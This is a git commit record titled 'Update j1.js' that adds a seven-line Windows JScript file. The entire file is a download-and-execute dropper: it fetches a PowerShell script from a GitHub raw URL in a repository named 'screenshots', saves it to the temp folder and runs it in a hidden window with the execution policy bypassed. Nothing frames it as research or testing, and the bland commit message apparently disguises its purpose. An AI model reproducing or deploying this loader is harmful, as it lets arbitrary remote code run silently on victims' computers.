3b4b0111fcbbd01ba2e7a49e27b3bf493794aa4e
cem324 <hvpauxr102@hotmail.com>
2026-09-22 12:28:00 +0000

    Update j1.js

---
+++ j1.js
@@ -0,0 +1,7 @@
+var x=new ActiveXObject("MSXML2.XMLHTTP");
+x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/v0_test.ps1",0);
+x.send();
+var fso=new ActiveXObject("Scripting.FileSystemObject");
+var t=fso.GetSpecialFolder(2)+"\\t.ps1";
+fso.CreateTextFile(t).Write(x.responseText);
+new ActiveXObject("WScript.Shell").Run("powershell -ExecutionPolicy Bypass -File \""+t+"\"",0);
